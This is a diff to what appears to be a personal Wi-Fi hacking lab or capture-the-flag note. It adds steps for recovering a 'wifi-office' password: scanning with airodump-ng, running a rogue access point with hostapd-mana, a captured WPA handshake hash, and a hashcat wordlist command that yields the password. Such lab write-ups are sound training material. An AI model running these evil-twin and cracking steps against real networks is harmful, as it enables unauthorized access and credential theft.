@@ -1,6 +1,7 @@
 ---
 title: 5 PSK
 tags:
+  - evil-twin
 ---
 # 8. What is the wifi-mobile AP password?
 
@@ -475,3 +476,33 @@ Client Isolationが有効でも、ARP応答が見えるケースや、APの実�
 ---
 
 # 12. What is the wifi-office password? 
+
+```zsh
+sudo airodump-ng wlan60
+```
+
+![[Pasted image 20261117034916.png]]
+
+![[Pasted image 20261117035017.png]]
+
+```zsh
+sudo hostapd-mana hostapd.conf
+```
+
+![[Pasted image 20261117035220.png]]
+
+office.hash
+
+```
+WPA*02*bee679d65b28daaf0f1555cd8adce12e*020000000100*78c1a7bf7246*776966692d6f666669636573*cac58924c9727dd7b39a6ce54c5f91ef6937d8a89612bc57f1798dd0fa64ec87*0103007502010a000000000000000000011465f81eddc6ba422f6ab53ea024e0956da15ab268755b29fecbcd6aa2343451000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001630140100000fac020100000fac040100000fac020000*00
+```
+
+```zsh
+sudo hashcat -a 0 -m 22000 office.hash  /usr/share/seclists/Passwords/Common-Credentials/xato-net-10-million-passwords.txt --force
+```
+
+![[Pasted image 20261117035821.png]]
+
+```
+password1
+```
